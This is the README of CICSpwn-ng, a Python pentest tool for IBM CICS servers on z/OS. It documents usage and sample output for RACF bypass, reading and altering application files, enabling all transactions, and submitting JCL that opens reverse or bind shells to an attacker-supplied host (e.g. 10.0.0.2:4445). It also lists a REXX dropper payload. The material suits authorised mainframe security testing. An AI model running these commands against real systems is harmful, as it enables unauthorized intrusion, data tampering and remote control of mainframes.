# CICSpwn-ng
> This is a Python 3 port of the original [CICSpwn](https://github.com/ayoul3/cicspwn) by [@Ayoul3__](https://github.com/ayoul3), with code cleanup, modernization and new features.

## Description
CICSpwn-ng is a tool to pentest CICS Transaction servers on z/OS.

## Features    
* Get general information about CICS and the underlying z/OS  
  * List available IBM supplied transactions
  * Get active sessions and userids
  * Get path (HLQ) of files and libraries
  * Check if CICS is using RACF/ACF2/TopSecret   
* Read files created by the application 
* Enables CECI and CEMT if they are RACF protected
* Remotely execute code using Spoolopen and TDqueue
* Checks security settings on z/OS

### New in -ng
* TLS/SSL support with `--ssl` and `--no-verify` for certificate validation control
* SOCKS/HTTP proxy support via `--proxy` (avoids proxychains TLS issues)
* Custom EBCDIC codepage and terminal model selection (`--codepage`, `--model`)
* Multi-LU support via `--lu` with comma-separated names for LU failover
* Custom login screen support: `--login-key` to send an AID key (PF1-PF24, Enter, Clear) before login, `--login-error` for custom error string detection
* Flexible `label:value` authentication with `-U` and `-P` for non-standard login screens (e.g. `-U "User ID:myuser" -P "Password:mypass"`)
* CESF signoff before session termination to free LU sessions

## Usage
```
$python3 cicspwn.py -h

       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    :::     ::::    :::  ::::::::
      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+:     :+:+:   :+: :+:    :+:
      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+     :+:+:+  +:+ +:+
      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+ +#+ +#+ +:+ +#+ +#+  #++#+
      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+#     +#+  +#+#+# +#+    +#+
      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+#     #+#   #+#+# #+#    #+#
       ########   ###########   ########    ########   ###         ###   ###  ###    ####     ###    ####  ########

                            The tool for some CICS p0wning !	Authors: @Ayoul3__ & @yukon

CicsPwn: a tool to pentest CICS transaction servers on z/OS

positional arguments:
  IP                    The z/OS Mainframe IP or Hostname
  PORT                  CICS/VTAM server Port

options:
  -h, --help            show this help message and exit
  -a, --applid APPLID   CICS ApplID on VTAM, default is CICS
  --custom-exit CUSTOM_CICS
                        Custom string to type to exit to CICS terminal
  --timeout TIMEOUT     Timeout in seconds for TN3270 negotiation (default: 30)
  --ssl                 Force SSL/TLS connection even on non-standard ports
  --no-verify           Disable TLS server certificate verification (useful
                        when connecting by IP)
  --lu LU               LU name(s) for the TN3270 session. Comma-separated to
                        try multiple (e.g. "LUA1,LUA2,LUA3")
  --proxy PROXY         SOCKS/HTTP proxy for s3270 (e.g.
                        socks5:user:pass@host:port). Avoids proxychains TLS
                        issues
  --codepage CODEPAGE   Host EBCDIC code page for s3270 (e.g. german-euro for
                        CP1141). Default: bracket (US)
  --model MODEL         3270 terminal model (2=24x80, 3=32x80, 4=43x80,
                        5=27x132). Default: 4

General information:
  -A, --all             Gather all information about a CICS Transaction Server
  -i, --info            Gather basic information about a CICS region
  -u, --userids         Scrape userids found in different menus
  -p, --pattern PATTERN
                        Specify a pattern of a files/transaction/tsqueue to
                        get (default is "*")
  -q, --quiet           Remove Trailing and journal before performing any
                        action
  --ceci CECI           CECI new transaction name. Result of -i option.
  --cemt CEMT           CEMT new transaction name. Result of -i option.
  --bypass              if CEDA is available, it copies CEMT and CECI to new
                        transid which bypasses RACF
  -b OLD_TRAN           if CEDA is available, it copies OLD_TRAN to NEW TRAN
                        (-n option) to bypass RACF. if no NEW TRAN is
                        specified, CICSpwn chooses an IBM supplied transaction
                        always available
  -n NEW_TRAN           if CEDA is available, it copies OLD_TRAN (-b) to NEW
                        TRAN to bypass RACF

Storage options:
  -f, --files           List all installed files a on TS CICS
  -e, --tsqueues        List all temporary storage queues on TS CICS
  --get-file FILENAME   Get the content of a file. It attempts to change the
                        status of the file if it's not enabled, opened or
                        readable
  --get-tsq TSQ_NAME    Get the content of a temporary storage queue.
  --add-record FILENAME_ADD
                        Add a record (--num) to FILE. if NUM exists, updates
                        the record
  --add-item TSQUEUE_ADD
                        Add an item (--num) to TSqueue. if NUM exists, updates
                        the item
  --num ITEM            # item to read/add/update from a file or TSQueue
  --data DATA           file containing new data to update the file

Transaction options:
  -t, --trans           Get all installed transactions on a CICS TS server
  --enable-trans ENA_TRANS
                        Enable a transaction (keyword ALL to enable every
                        transaction)
  --check-trans CHECK_TRANS
                        Checks security access to the transactions specified
                        in <file.txt>
  --check-files CHECK_FILES
                        Checks security access to the files specified in
                        <file.txt>

Access options:
  -U, --userid USERID   Specify userid as label:value (e.g.
                        "User ID:myuser"). Label is the field name on
                        screen.
  -P, --password PASSWORD
                        Specify password as label:value (e.g.
                        "Password:mypass"). Label is the field name on screen.
  --login-error LOGIN_ERRORS
                        Custom error string to detect failed login (e.g.
                        "Invalid"). Can be specified multiple times.
  --login-key LOGIN_KEY
                        AID key to send on initial screen before login (e.g.
                        "pf5", "enter", "clear"). Use when the CICS welcome
                        screen requires a key press to reach the login screen.
  -r PROPAGATE_USER     Given the region user ID, checks wether you are
                        allowed to use it to submit JOBs
  -g SURROGAT_USER      Checks wether you can impersonate another user when
                        submitting a job

JOB options:
  -s, --submit SUBMIT   Submit JCL to CICS server. Specify:
                        dummy,reverse_unix, reverse_tso, direct_unix,
                        reverse_unix, ftp or custom (need -j option)
  --queue QUEUE         Provides the name of the TD queue to submit a JOB
  --ftp-cmds FTP_CMDS   Files containig a list of ftp commands to execute
  --node NODE           System node name where the JOB should be submitted
                        (works only with Spool functions)
  -l, --lhost LHOST     Remote server to call back to for reverse shell
                        (host:port)
  --port PORT           Remote port to open for bind shell in REXX
  --jcl JCL             Custom JCL file to provide
  --rexx REXX_FILE      Custom REXX file to execute in memory. No label or
                        line continuation must be present in the file

```
## Prerequisites
Python 3  
x3270, s3270 or wc3270.exe installed on your system  
```
pip3 install -r requirements.txt
```

## Connection Options

### Proxy
When connecting through a SOCKS or HTTP proxy, use the built-in `--proxy` option instead of proxychains. The proxychains `LD_PRELOAD` mechanism interferes with s3270's OpenSSL TLS handshake, causing connection failures on TLS-enabled targets.
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i --proxy socks5:user:pass@proxyhost:1080
```
Supported proxy types follow the s3270 format: `socks4://`, `socks5:`, `http://`, etc.

### TLS
For TLS-enabled targets (commonly port 992), use `--ssl`. Add `--no-verify` when connecting by IP or when the server certificate is self-signed:
```
python3 cicspwn.py 10.0.0.1 992 -a CICS -i --ssl --no-verify
```

### LU Names
Some environments require a specific LU name. Use `--lu` with comma-separated names to try multiple:
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i --lu "LU01,LU02,LU03"
```

### Codepage and Terminal Model
For non-US EBCDIC hosts, specify the codepage (e.g. `german-euro` for CP1141). The terminal model controls screen dimensions:
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i --codepage german-euro --model 4
```

## Authentication

### Custom Login Screens
Many CICS environments use custom login screens with non-standard field labels. Use `label:value` format with `-U` and `-P` to match the field labels on screen:
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U "User ID:myuser" -P "Password:mypass"
```
If field labels are standard (e.g. "Userid" and "Password"), plain values still work:
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass
```

### Login Key
When a CICS welcome screen or VTAM menu requires a key press to reach the login screen, use `--login-key`:
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass --login-key pf5
```
Supported keys: `pf1`-`pf24`, `enter`, `clear`.

### Custom Error Detection
If the login screen shows errors in a non-English language, use `--login-error` (can be specified multiple times):
```
python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass --login-error "Invalid" --login-error "Denied"
```

## Getting general information
```
$ python3 cicspwn.py -a CICS 10.0.0.1 23 -i
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting information about CICS server (APPLID: CICS)
	[*] CICS TS Version: 3.2
	[*] CICS default user: CICSUSER
[+] Interesting and available IBM supplied transactions: 
	[*] CEMT
	[*] CEDA
	[*] CECI
	[*] CECS
	[*] CEBR
[+] General system information: 
	[*] Userid: CICSUSER
	[*] Sysid: S650
	[*] LU session name: LCL702
	[*] language: E
	[*] Files HLQ:	CICS650.**
	[*] Library path:	DFH320.CICS.**
[+] Active users
	[*] CICSUSER
	[*] CICSUSER
	[*] CICSUSER
[+] JCL Submission
	[*] Access to the internal spool is apparently available
[+] Access control
	[*] CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID

```
## Read a file
```
$ python3 cicspwn.py -a CICS 10.0.0.1 23 --get-file FILEA
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting Attributes of file FILEA
[*] File FILEA is enabled, open, and readable
[*] Record size: 80	keylength:6
' 000100':	START OF DATA
...
```  
Ps: adding --num option fetches only one record

## Add a record to a file
```
$ python3 cicspwn.py -a CICS 10.0.0.1 23 --add-record FILEA --num ' 400018' --data file.txt
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[*] File FILEA is enabled and open
[*] Record size: 80	keylength:6
[+] Adding record 400018 of file FILEA
[*] Record 400018 was added successfully to file FILEA

```
PS: if record number 400018 exists, CICSpwn updates the record automatically so please be careful.

## List TSQueues
```
$ python3 cicspwn.py -a CICS 10.0.0.1 23 -e
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting all tsqueues that match *
Tsqueue	Items	Length	Transaction
KOS5	00001	0000000064	CECI
TEST	00001	0000000064	CECI
TES5	00001	0000000064	CECI
...

```

## Activate ALL transactions
```
$ python3 cicspwn.py 10.0.0.1 23 -a CICS -U myuser -P mypass --enable-tran ALL
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[*] Successful authentication
[+] Activating ALL transactions
[*] All transactions are enabled
...
```

## Reverse shell using CICSpwn
```
$ python3 cicspwn.py -a CICS 10.0.0.1 23 -s reverse_tso -l 10.0.0.2:4445
[+] Connecting to target 10.0.0.1:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Setting the current terminal to mixed case
[*] Got TerminalID L702
[*] Current terminal is NOW mixed case
[+] Spool not available apparently, trying via TDQueue
[+] Writing to the internal TDQueue
	[*] JCL Written to TDqueue, it should be executed any second

```
## Available shell payloads
* **Reverse_tso**: spawns a reverse tso shell to the host specified by --lhost ip:port option.
* **direct_tso**: same as reverse_tso but binds the shell to --port option
* **reverse_unix**: spawns a reverse unix shell to the host specified by --lhost ip:port option.
* **direct_unix**: same as reverse_unix but binds the shell to --port option
* **ftp**: connects to a remote ftp server specified by --lhost ip:port and executes commands specified in file --ftp-cmds
* **reverse_rexx**: writes a dropper to disk that fetches a rexx payload  from --lhost ip:port and executes it in memory. The listener is handled by CICSpwn. The only constraint is that the rexx file must not contain labels or continuation lines
* **custom**: sends a custom JCL specified by --jcl option
* **dummy**: executes ftp to --lhost ip:port to make sure reverse connection is possible


## Copyright and license  
CICSpwn is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  
CICSpwn is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with nmaptocsv. If not, see http://www.gnu.org/licenses/.

## Credit
The REXX code of the direct/reverse shell was mainly inspired by the work of [@mainframed767](https://github.com/mainframed/Mainframed)  
Py3270 wrapper class was provided by [@singe](https://github.com/sensepost/birp)

## Contact
Ayoub ELAASSAL ayoul3.zos at gmail dot com
